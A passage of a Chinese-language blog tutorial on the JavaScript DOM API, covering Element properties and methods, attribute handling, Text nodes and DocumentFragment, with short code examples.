<code>true</code>。</li><li>第二个参数为布尔值（可选），设置后会将方法变成单向操作<ul><li><code>false</code>：仅会删除标记列表中匹配的给定标记，且不会再度添加。</li><li><code>true</code>：在标记列表中添加给定标记，且不会再度删除。</li></ul></li></ul></li><li><code>item()</code>：返回指定索引位置的 class。</li><li><code>toString()</code>：将 class 的列表转为字符串。</li></ul><p>例子：className和classList添加、删除元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> foo = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><br><span class="hljs-comment">// 添加class</span><br>foo.<span class="hljs-property">className</span> += <span class="hljs-string">&#x27;bold&#x27;</span>;<br>foo.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;bold&#x27;</span>);<br><br><span class="hljs-comment">// 删除class</span><br>foo.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;bold&#x27;</span>);<br>foo.<span class="hljs-property">className</span> = foo.<span class="hljs-property">className</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^bold$/</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="Element-dataset"><a href="#Element-dataset" class="headerlink" title="Element.dataset"></a>Element.dataset</h4><p>HTMLElement 接口的只读属性 dataset 提供了对元素上<strong>自定义数据属性（data-*）</strong>读&#x2F;写访问。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">// <span class="hljs-tag">&lt;<span class="hljs-name">article</span></span><br><span class="hljs-tag">//   <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;foo&quot;</span></span><br><span class="hljs-tag">//   <span class="hljs-attr">data-columns</span>=<span class="hljs-string">&quot;3&quot;</span></span><br><span class="hljs-tag">//   <span class="hljs-attr">data-index-number</span>=<span class="hljs-string">&quot;12314&quot;</span></span><br><span class="hljs-tag">//   <span class="hljs-attr">data-parent</span>=<span class="hljs-string">&quot;cars&quot;</span>&gt;</span><br>//   ...<br>// <span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br>var article = document.getElementById(&#x27;foo&#x27;);<br>article.dataset.columns // &quot;3&quot;<br>article.dataset.indexNumber // &quot;12314&quot;<br>article.dataset.parent // &quot;cars&quot;<br></code></pre></td></tr></table></figure><p>在HTML中，该属性名以 data- 开头。它只能包含字母、数字、破折号（<code>-</code>）、句号（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>）。任意的 ASCII 大写字母（A 到 Z）都会转换为小写。</p><p>转成JavaScript对应的<code>dataset</code>，规则如下：</p><ul><li>开头<code>data-</code> 省略</li><li>若连接线<code>-</code>后跟了一个英文字母，连接线会取消，字母变大写</li><li>其他字符不变。</li></ul><h4 id="Element-innerHTML"><a href="#Element-innerHTML" class="headerlink" title="Element.innerHTML"></a>Element.innerHTML</h4><p>设置或获取 HTML 语法表示的元素的后代。</p><p><code>Element.innerHTML</code> 返回一个字符串。等同于该元素包含的所有HTML代码。</p><p>常用来设置某个节点的内容。</p><blockquote><p><strong>备注：</strong> 如果一个 <code>&lt;div&gt;</code> <code>&lt;span&gt;</code>或 <code>&lt;noembed&gt;</code>,节点有一个文本子节点，该节点包含字符 <code>(&amp;)</code>, <code>(&lt;)</code>, 或 <code>(&gt;)</code>, <code>innerHTML</code> 将这些字符分别返回为 <code>&amp;amp;, &amp;lt; 和 &amp;gt;</code>。使用<code>Node.textContent</code> 可获取一个这些文本节点内容的正确副本。</p></blockquote><p>如果文本之中含有<code>&lt;script&gt;</code>标签，虽然可以生成<code>script</code>节点，但是插入的代码不会执行。</p><p>但出于安全考虑（可能会出现xss攻击等安全问题），最好在插入文本时，使用<code>textContent</code>。</p><h4 id="Element-outerHTML"><a href="#Element-outerHTML" class="headerlink" title="Element.outerHTML"></a>Element.outerHTML</h4><p>返回一个字符串，表示当前元素节点的所有 HTML 代码，<strong>包括该元素本身和所有子元素</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// HTML:</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">&lt;div id=&quot;d&quot;&gt;</span><br><span class="hljs-comment">    &lt;p&gt;Content&lt;/p&gt;</span><br><span class="hljs-comment">    &lt;p&gt;Further Elaborated&lt;/p&gt;</span><br><span class="hljs-comment">&lt;/div&gt;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">const</span> d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d.<span class="hljs-property">outerHTML</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    字符串 &#x27;&lt;div id=&quot;d&quot;&gt;&lt;p&gt;Content&lt;/p&gt;&lt;p&gt;Further Elaborated&lt;/p&gt;&lt;/div&gt;&#x27;</span><br><span class="hljs-comment">    被显示到控制台窗口</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>注意：如果元素没有父元素，即如果它是文档的根元素，则设置其 outerHTML 属性将抛出一个带有错误代码 <strong>NO_MODIFICATION_ALLOWED_ERR</strong> 的 DOMException。</p><h4 id="Element-clientHeight，Element-clientWidth"><a href="#Element-clientHeight，Element-clientWidth" class="headerlink" title="Element.clientHeight，Element.clientWidth"></a>Element.clientHeight，Element.clientWidth</h4><p><strong>Element.clientHeight</strong> 返回一个<strong>整数值</strong>，表示元素节点<strong>css高度</strong>（px）。</p><p><strong>Element.clientWidth</strong> 返回一个<strong>整数值</strong>，表示元素节点<strong>css宽度</strong>。 </p><ul><li>只对块级元素生效，行内元素返回0</li><li>若没有设置css高度，则返回实际高度。</li><li>高度包括元素本身高度+padding。不包括border、margin、滚动条。</li><li>宽度只包括元素本身的宽度和<code>padding</code>。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 视口高度（等同于window.innerHeight - 滚动条)</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span><br><br><span class="hljs-comment">// 网页总高度</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">clientHeight</span><br></code></pre></td></tr></table></figure><h4 id="Element-clientLeft，Element-clientTop"><a href="#Element-clientLeft，Element-clientTop" class="headerlink" title="Element.clientLeft，Element.clientTop"></a>Element.clientLeft，Element.clientTop</h4><p><strong>左边框宽度</strong>和<strong>顶部边框宽度</strong>。单位px。</p><p>如果没有设置左边框，或者是行内元素（<code>display: inline</code>），该属性返回<code>0</code>。</p><h4 id="Element-scrollHeight，Element-scrollWidth"><a href="#Element-scrollHeight，Element-scrollWidth" class="headerlink" title="Element.scrollHeight，Element.scrollWidth"></a>Element.scrollHeight，Element.scrollWidth</h4><p>返回一个整数值。</p><p><strong>Element.scrollHeight</strong>表示当前元素的总高度（px），包括溢出容器、当前不可见的部分（包括padding，但不包括border、margin及滚动条）、伪元素的高度。</p><ul><li>如果元素节点的内容出现溢出，即使溢出的内容是隐藏的，<code>scrollHeight</code>属性仍然返回元素的总高度。</li></ul><p><strong>Element.scrollWidth</strong>属性表示当前元素的总宽度（单位像素），其他地方都与<code>scrollHeight</code>属性类似。</p><p>这两个属性只读。</p><h4 id="Element-scrollLeft，Element-scrollTop"><a href="#Element-scrollLeft，Element-scrollTop" class="headerlink" title="Element.scrollLeft，Element.scrollTop"></a>Element.scrollLeft，Element.scrollTop</h4><p><strong>水平滚动条</strong>和<strong>垂直滚动条</strong>的像素数量。</p><p>可读写。</p><h4 id="Element-offsetParent"><a href="#Element-offsetParent" class="headerlink" title="Element.offsetParent"></a>Element.offsetParent</h4><p>返回最靠近当前元素的，且css的<code>position</code>不等于<code>static</code>。</p><p>该元素主要用于确定子元素位置偏移的计算基准。<code>Element.offsetTop</code>和<code>Element.offsetLeft</code>就是<code>offsetParent</code>元素计算的。</p><p>如果该元素是不可见的（<code>display</code>属性为<code>none</code>），或者位置是固定的（<code>position</code>属性为<code>fixed</code>），则<code>offsetParent</code>属性返回<code>null</code>。</p><h4 id="Element-offsetHeight，Element-offsetWidth"><a href="#Element-offsetHeight，Element-offsetWidth" class="headerlink" title="Element.offsetHeight，Element.offsetWidth"></a>Element.offsetHeight，Element.offsetWidth</h4><p>元素的CSS<strong>垂直高度</strong>和<strong>水平宽度</strong>。</p><p>这两个属性都是只读属性，只比<code>Element.clientHeight</code>和<code>Element.clientWidth</code>多了边框的高度或宽度。</p><h4 id="Element-offsetLeft，Element-offsetTop"><a href="#Element-offsetLeft，Element-offsetTop" class="headerlink" title="Element.offsetLeft，Element.offsetTop"></a>Element.offsetLeft，Element.offsetTop</h4><p><code>Element.offsetLeft</code>返回当前元素左上角相对于<code>Element.offsetParent</code>节点的<strong>水平位移</strong>。</p><p><code>Element.offsetTop</code>返回<strong>垂直位移</strong>，单位为像素。</p><p>通常，这两个值是指相对于父节点的<strong>位移</strong>。</p><h4 id="Element-style"><a href="#Element-style" class="headerlink" title="Element.style"></a>Element.style</h4><p>读写该元素的行内样式信息。</p><h4 id="Element-children"><a href="#Element-children" class="headerlink" title="Element.children"></a>Element.children</h4><p>返回一个类数组（<code>HTMLCollection</code>实例），<strong>包括当前元素节点的所有子元素。</strong></p><p>和<code>Node.childNodes</code>属性的区别：<code>Element.children</code>只包括元素类型的子节点，不包括其他类型的子节点。</p><h4 id="Element-childElementCount"><a href="#Element-childElementCount" class="headerlink" title="Element.childElementCount"></a>Element.childElementCount</h4><p>返回当前元素节点<strong>包含的子元素节点的个数</strong>，与<code>Element.children.length</code>的值相同。</p><h4 id="Element-firstElementChild，Element-lastElementChild"><a href="#Element-firstElementChild，Element-lastElementChild" class="headerlink" title="Element.firstElementChild，Element.lastElementChild"></a>Element.firstElementChild，Element.lastElementChild</h4><p>返回当前元素的<strong>第一个&#x2F;最后一个</strong> 元素子节点。</p><h4 id="Element-nextElementSibling，Element-previousElementSibling"><a href="#Element-nextElementSibling，Element-previousElementSibling" class="headerlink" title="Element.nextElementSibling，Element.previousElementSibling"></a>Element.nextElementSibling，Element.previousElementSibling</h4><p>返回<strong>当前元素节点后&#x2F;前</strong>一个同级元素节点。若无，返回null</p><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><h4 id="属性相关方法"><a href="#属性相关方法" class="headerlink" title="属性相关方法"></a>属性相关方法</h4><p>元素节点提供六个方法，用来操作属性。</p><ul><li><code>getAttribute()</code>：读取某个属性的值</li><li><code>getAttributeNames()</code>：返回当前元素的所有属性名</li><li><code>setAttribute()</code>：写入属性值</li><li><code>hasAttribute()</code>：某个属性是否存在</li><li><code>hasAttributes()</code>：当前元素是否有属性</li><li><code>removeAttribute()</code>：删除属性</li></ul><h4 id="Element-querySelector"><a href="#Element-querySelector" class="headerlink" title="Element.querySelector()"></a>Element.querySelector()</h4><p>接受 CSS 选择器作为参数，返回父元素的<strong>第一个匹配的子元素</strong>。如果没有找到匹配的子元素，就返回<code>null</code>。</p><ul><li><p>该方法无法选择伪元素。</p></li><li><p>可接受复杂的CSS选择器。</p></li><li><p>接受多个选择器时，用逗号分割</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//返回element的第一个div或p子元素。</span><br>element.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;div, p&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="Element-querySelectorAll"><a href="#Element-querySelectorAll" class="headerlink" title="Element.querySelectorAll()"></a>Element.querySelectorAll()</h4><p>接受 CSS 选择器作为参数，返回一个<code>NodeList</code>实例，包含<strong>所有匹配的子元素</strong>。</p><h4 id="Element-getElementsByClassName"><a href="#Element-getElementsByClassName" class="headerlink" title="Element.getElementsByClassName()"></a>Element.getElementsByClassName()</h4><p>返回一个<code>HTMLCollection</code>实例，成员是当前元素节点的<strong>所有具有指定 class 的子元素节点</strong>。</p><p>和<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围是当前元素节点。</p><p>该方法参数大小写敏感。</p><h4 id="Element-getElementsByTagName"><a href="#Element-getElementsByTagName" class="headerlink" title="Element.getElementsByTagName()"></a>Element.getElementsByTagName()</h4><p>返回一个<code>HTMLCollection</code>实例，成员是当前节点的<strong>所有匹配指定标签名的子元素节点</strong>。</p><p>参数大小写不敏感。</p><h4 id="Element-closest"><a href="#Element-closest" class="headerlink" title="Element.closest()"></a>Element.closest()</h4><p>接受一个 CSS 选择器作为参数，返回匹配该选择器的、<strong>最接近当前节点</strong>的一个<strong>祖先节点</strong>（包括当前节点本身）。</p><p>如果没有任何节点匹配 CSS 选择器，则返回<code>null</code>。</p><h4 id="Element-matches"><a href="#Element-matches" class="headerlink" title="Element.matches()"></a>Element.matches()</h4><p>返回一个布尔值。表示当前元素<strong>是否匹配</strong>给定的 CSS 选择器。</p><h4 id="事件相关方法"><a href="#事件相关方法" class="headerlink" title="事件相关方法"></a>事件相关方法</h4><ul><li><code>Element.addEventListener()</code>：添加事件的回调函数</li><li><code>Element.removeEventListener()</code>：移除事件监听函数</li><li><code>Element.dispatchEvent()</code>：触发事件</li></ul><p>以上三个方法都继承自<code>EventTarget</code>接口。</p><h4 id="Element-scrollIntoView"><a href="#Element-scrollIntoView" class="headerlink" title="Element.scrollIntoView()"></a>Element.scrollIntoView()</h4><p>Element 接口的 <code>scrollIntoView() </code>方法会滚动元素的父容器，使被调用 <code>scrollIntoView() </code>的元素对用户可见。</p><p>语法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">scrollIntoView</span>()<br><span class="hljs-title function_">scrollIntoView</span>(alignToTop)<br><span class="hljs-title function_">scrollIntoView</span>(scrollIntoViewOptions)<br></code></pre></td></tr></table></figure><h4 id="Element-getBoundingClientRect"><a href="#Element-getBoundingClientRect" class="headerlink" title="Element.getBoundingClientRect()"></a>Element.getBoundingClientRect()</h4><p>返回一个对象，其提供了元素的大小及其相对于视口的位置。</p><p>该对象使用 <code>left</code>、<code>top</code>、<code>right</code>、<code>bottom</code>、<code>x</code>、<code>y</code>、<code>width</code> 和 <code>height</code> 这几个以像素为单位的只读属性描述整个矩形的位置和大小。</p><h4 id="Element-getClientRects"><a href="#Element-getClientRects" class="headerlink" title="Element.getClientRects()"></a>Element.getClientRects()</h4><p>返回一个指向客户端中每一个盒子的边界矩形的矩形集合（当前元素在页面上形成的所有矩形（所以方法名中的<code>Rect</code>用的是复数））。</p><p>每个矩形都有<code>bottom</code>、<code>height</code>、<code>left</code>、<code>right</code>、<code>top</code>和<code>width</code>六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。</p><h4 id="Element-insertAdjacentElement"><a href="#Element-insertAdjacentElement" class="headerlink" title="Element.insertAdjacentElement()"></a>Element.insertAdjacentElement()</h4><p>相对于当前元素的指定位置，<strong>插入一个新的节点</strong>。该方法返回被插入的节点，如果插入失败，返回<code>null</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">element.<span class="hljs-title function_">insertAdjacentElement</span>(position, element);<br></code></pre></td></tr></table></figure><p>参数position的值：</p><ul><li><code>beforebegin</code>：当前元素之前</li><li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li><li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li><li><code>afterend</code>：当前元素之后</li></ul><h4 id="Element-insertAdjacentHTML-，ElementinsertAdjacentText"><a href="#Element-insertAdjacentHTML-，ElementinsertAdjacentText" class="headerlink" title="Element.insertAdjacentHTML()，ElementinsertAdjacentText()"></a>Element.insertAdjacentHTML()，ElementinsertAdjacentText()</h4><p><strong>Element.insertAdjacentHTML()</strong> 用于将一个 HTML 字符串，<strong>解析生成 DOM 结构</strong>，<strong>插入</strong>相对于当前节点的指定位置。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">element.insert<span class="hljs-constructor">AdjacentHTML(<span class="hljs-params">position</span>, <span class="hljs-params">text</span>)</span>;<br></code></pre></td></tr></table></figure><p><strong>ElementinsertAdjacentText()</strong> 在<strong>相对于当前节点的指定位置</strong>，<strong>插入</strong>一个文本节点。</p><h4 id="Element-remove"><a href="#Element-remove" class="headerlink" title="Element.remove()"></a>Element.remove()</h4><p>继承自 ChildNode 接口，用于<strong>将当前元素节点从它的父节点移除</strong>。</p><h4 id="Element-focus-，Element-blur"><a href="#Element-focus-，Element-blur" class="headerlink" title="Element.focus()，Element.blur()"></a>Element.focus()，Element.blur()</h4><p>Element.focus() 用于将<strong>当前页面的焦点</strong>，<strong>转移到指定元素</strong>上。</p><p>Element.blur() 用于从当前元素<strong>移除焦点</strong>。</p><h4 id="Element-click"><a href="#Element-click" class="headerlink" title="Element.click()"></a>Element.click()</h4><p>用于在当前元素上<strong>模拟一次鼠标点击</strong>，相当于触发了<code>click</code>事件。</p><h2 id="属性的操作"><a href="#属性的操作" class="headerlink" title="属性的操作"></a>属性的操作</h2><p>属性本身就是一个对象（<code>Attr</code>对象），但更多时候是通过元素节点对象（<code>HTMlElement</code>对象）来操作属性。</p><h3 id="Element-attributes-属性"><a href="#Element-attributes-属性" class="headerlink" title="Element.attributes 属性"></a>Element.attributes 属性</h3><p>元素对象有一个<code>attributes</code>属性，返回一个类数组的动态对象（<code>NamedNodeMap</code>对象），成员是该元素标签的<strong>所有属性节点对象</strong>，属性的<strong>实时变化</strong>都会反映在这个节点对象上。</p><p>属性可以通过序号引用、或属性名引用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// HTML 代码如下</span><br><span class="hljs-comment">// &lt;body bgcolor=&quot;yellow&quot; onload=&quot;&quot;&gt;</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">attributes</span>[<span class="hljs-number">0</span>]<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">attributes</span>.<span class="hljs-property">bgcolor</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">attributes</span>[<span class="hljs-string">&#x27;ONLOAD&#x27;</span>]<br><span class="hljs-comment">//以上返回的都是属性节点对象，不是属性值</span><br></code></pre></td></tr></table></figure><p>属性节点对象有<code>name</code>和<code>value</code>属性，对应该属性的属性名和属性值，等同于<code>nodeName</code>属性和<code>nodeValue</code>属性。</p><p>例子：遍历一个元素节点的所有属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> para = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;p&#x27;</span>)[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;result&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (para.<span class="hljs-title function_">hasAttributes</span>()) &#123;<br>  <span class="hljs-keyword">var</span> attrs = para.<span class="hljs-property">attributes</span>;<br>  <span class="hljs-keyword">var</span> output = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = attrs.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    output += attrs[i].<span class="hljs-property">name</span> + <span class="hljs-string">&#x27;-&gt;&#x27;</span> + attrs[i].<span class="hljs-property">value</span>;<br>  &#125;<br>  result.<span class="hljs-property">textContent</span> = output;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  result.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;No attributes to show&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="元素的标准属性"><a href="#元素的标准属性" class="headerlink" title="元素的标准属性"></a>元素的标准属性</h3><p>HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br>a.<span class="hljs-property">id</span> <span class="hljs-comment">// &quot;test&quot;</span><br>a.<span class="hljs-property">href</span> <span class="hljs-comment">// &quot;http://www.example.com/&quot;</span><br></code></pre></td></tr></table></figure><p>上面代码中，<code>a</code>元素标签的属性<code>id</code>和<code>href</code>，自动成为节点对象的属性。</p><p>HTML元素属性名对大小写不敏感，但JavaScript对象的属性名对大小写敏感。</p><p>转换规则为，转成JavaScript属性名时，一律采取小写。如果属性名包括多个单词，则采用骆驼拼写法。</p><p>若碰到JavaScript的保留字，则必须改名。</p><h3 id="属性操作的标准方法"><a href="#属性操作的标准方法" class="headerlink" title="属性操作的标准方法"></a>属性操作的标准方法</h3><p>元素节点提供六个方法，用来操作属性。</p><ul><li><code>getAttribute()</code> —— 返回当前元素的指定属性</li><li><code>getAttributeNames()</code>——返回一个数组，当前元素<strong>所有属性的名称</strong>。</li><li><code>setAttribute()</code>—— 为当前元素节点<strong>新增属性</strong></li><li><code>hasAttribute()</code> —— 返回布尔值。当前元素节点<strong>是否包含</strong>指定属性。</li><li><code>hasAttributes()</code>—— 返回布尔值。当前元素<strong>是否有属性</strong>。</li><li><code>removeAttribute()</code>——<strong>移除</strong>指定属性。没有返回值。</li></ul><p>这六个方法对所有属性都适用。</p><p>这些方法只接受属性的标准名称，不用改写保留字，比如<code>for</code>和<code>class</code>都可以直接使用。另外，这些方法对于属性名是大小写不敏感的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> image = <span class="hljs-variable language_">document</span>.<span class="hljs-property">images</span>[<span class="hljs-number">0</span>];<br>image.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;myImage&#x27;</span>);<br></code></pre></td></tr></table></figure><p>上面代码中，<code>setAttribute</code>方法直接使用<code>class</code>作为属性名，不用写成<code>className</code>。</p><h3 id="dataset属性"><a href="#dataset属性" class="headerlink" title="dataset属性"></a>dataset属性</h3><p>有时需要在HTML元素上附加属性，供JavaScript脚本使用。</p><p>可以使用标准提供的<code>data-*</code>属性。</p><p>再使用元素节点对象的<code>dataset</code>属性，它指向一个对象，可以用来操作 HTML 元素标签的<code>data-*</code>属性。</p><p>例如：添加foo</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div id=<span class="hljs-string">&quot;mydiv&quot;</span> data-foo=<span class="hljs-string">&quot;bar&quot;</span>&gt;<br><span class="hljs-comment">//js</span><br><span class="hljs-keyword">var</span> n = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;mydiv&#x27;</span>);<br>n.<span class="hljs-property">dataset</span>.<span class="hljs-property">foo</span> <span class="hljs-comment">// bar</span><br>n.<span class="hljs-property">dataset</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&#x27;baz&#x27;</span>  <span class="hljs-comment">//修改为baz</span><br></code></pre></td></tr></table></figure><p><code>data-*</code>属性支持<code>delete</code>命令。</p><h2 id="Text节点"><a href="#Text节点" class="headerlink" title="Text节点"></a>Text节点</h2><p>文本节点（<code>Text</code>）代表<strong>元素节点（<code>Element</code>）和属性节点（<code>Attribute</code>）</strong>的<strong>文本内容</strong>。如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。</p><p>通常我们使用父节点的<code>firstChild</code>、<code>nextSibling</code>等属性<strong>获取</strong>文本节点。</p><p>或者使用<code>Document</code>节点的<code>createTextNode</code>方法<strong>创造</strong>一个文本节点。</p><h3 id="属性-6"><a href="#属性-6" class="headerlink" title="属性"></a>属性</h3><ul><li><strong>data</strong>——等同于<code>nodeValue</code>属性，用来<strong>设置或读取</strong>文本节点的内容。</li><li><strong>wholeText</strong> —— 返回当前文本节点与毗邻的文本节点</li><li><strong>length</strong> —— 文本节点的文本<strong>长度</strong></li><li><strong>nextElementSibling</strong> —— 紧跟当前文本节点后的那个同级元素节点</li><li><strong>previousElementSibling</strong> —— 当前文本节点前最近的那个同级元素节点</li></ul><h3 id="方法-5"><a href="#方法-5" class="headerlink" title="方法"></a>方法</h3><ul><li><p>appendData() —— 在Text节点<strong>尾部追加</strong>字符串。</p></li><li><p>deleteData() —— <strong>删除</strong>Text节点内部的子字符串</p><ul><li>第一个参数：子字符串<strong>开始位置</strong></li><li>第二个参数：子字符串<strong>长度</strong>。</li></ul></li><li><p>insertData()——在Text节点<strong>插入</strong>字符串</p><ul><li>第一个参数：插入<strong>位置</strong></li><li>第二个参数：插入的<strong>子字符串</strong>。</li></ul></li><li><p>replaceData()——用于<strong>替换</strong>文本</p><ul><li>第一个参数：替换开始<strong>位置</strong></li><li>第二个参数：需要被替换掉的<strong>长度</strong></li><li>第三个参数：新加入的<strong>字符串</strong>。</li></ul></li><li><p>subStringData()——用于获取子字符串</p><ul><li>第一个参数：子字符串在Text节点中的<strong>开始位置</strong></li><li>第二个参数：子字符串<strong>长度</strong>。</li></ul></li><li><p>remove() —— <strong>移除</strong>当前Text节点</p></li><li><p>splitText() —— <strong>分割</strong>Text节点。变成两个毗邻的Text节点。</p><ul><li><p>参数：分割位置</p></li><li><p>父元素节点的<strong>normalize</strong>方法可以再将两个字符串合并。</p></li></ul></li></ul><h2 id="DocumentFragment节点"><a href="#DocumentFragment节点" class="headerlink" title="DocumentFragment节点"></a>DocumentFragment节点</h2><p><code>DocumentFragment</code>节点代表<strong>一个文档的片段</strong>，本身就是一个完整的 DOM 树形结构。</p><p>它<strong>没有父节点</strong>，<code>parentNode</code>返回<code>null</code>，但是可以插入任意数量的子节点。</p><p>它<strong>不属于当前文档</strong>，操作<code>DocumentFragment</code>节点，要比直接操作 DOM 树快得多。</p><p>常用于构造DOM结构，之后插入当前文档。</p><p><strong><code>document.createDocumentFragment</code><strong>方法，以及浏览器原生的</strong><code>DocumentFragment</code><strong>构造函数，可以</strong>创建</strong>一个空的<code>DocumentFragment</code>节点。</p><p><code>DocumentFragment</code>节点<strong>本身不能被插入当前文档</strong>。</p><ul><li>当它作为<code>appendChild()</code>、<code>insertBefore()</code>、<code>replaceChild()</code>等方法的参数时，是它的所有子节点插入当前文档，而不是它自身。</li><li>一旦<code>DocumentFragment</code>节点被添加进当前文档，它自身就变成了空节点（<code>textContent</code>属性为空字符串），可以被再次使用。</li><li>如果想要保存<code>DocumentFragment</code>节点的内容，可以使用<code>cloneNode</code>方法。</li></ul><p>它<strong>没有自己的属性和方法</strong>，全部继承自Node节点和ParentNode节点。</p><p>所以，相较于Node节点，它多出以下四个属性：</p><ul><li><code>children</code>：返回一个动态的<code>HTMLCollection</code>集合对象，包括当前<code>DocumentFragment</code>对象的所有子元素节点。</li><li><code>firstElementChild</code>：返回当前<code>DocumentFragment</code>对象的第一个子元素节点，如果没有则返回<code>null</code>。</li><li><code>lastElementChild</code>：返回当前<code>DocumentFragment</code>对象的最后一个子元素节点，如果没有则返回<code>null</code>。</li><li><code>childElementCount</code>：返回当前<code>DocumentFragment</code>对象的所有子元素数量。</li></ul><h2 id="CSS操作"><a href="#CSS操作" class="headerlink" 